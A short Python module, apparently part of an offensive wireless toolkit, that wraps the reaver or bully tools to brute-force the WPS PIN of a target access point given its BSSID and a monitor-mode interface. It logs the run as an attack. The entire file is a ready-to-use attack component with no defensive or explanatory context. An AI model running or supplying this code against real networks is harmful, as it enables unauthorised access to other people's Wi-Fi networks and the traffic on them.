"""
WPS PIN Bruteforce: wraps reaver or bully.
"""
import shutil
import subprocess


class WPSBrute:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def run(self, args):
        bssid = args.bssid
        iface = self.config.mon_iface
        if not bssid:
            self.logger.error("BSSID required for WPS brute force.")
            return False

        tool = None
        if shutil.which("reaver"):
            tool = "reaver"
        elif shutil.which("bully"):
            tool = "bully"
        else:
            self.logger.error("Neither reaver nor bully found. Install one first.")
            return False

        self.logger.attack_log(f"WPS brute -> {bssid} via {tool}")
        try:
            if tool == "reaver":
                cmd = ["reaver", "-i", iface, "-b", bssid, "-vv"]
            else:
                cmd = ["bully", "-b", bssid, iface]
            subprocess.run(cmd, timeout=args.timeout)
            self.logger.success("WPS brute force completed.")
            return True
        except subprocess.TimeoutExpired:
            self.logger.warning("WPS brute force timed out.")
            return False
        except Exception as e:
            self.logger.error(f"WPS brute force failed: {e}")
            return False
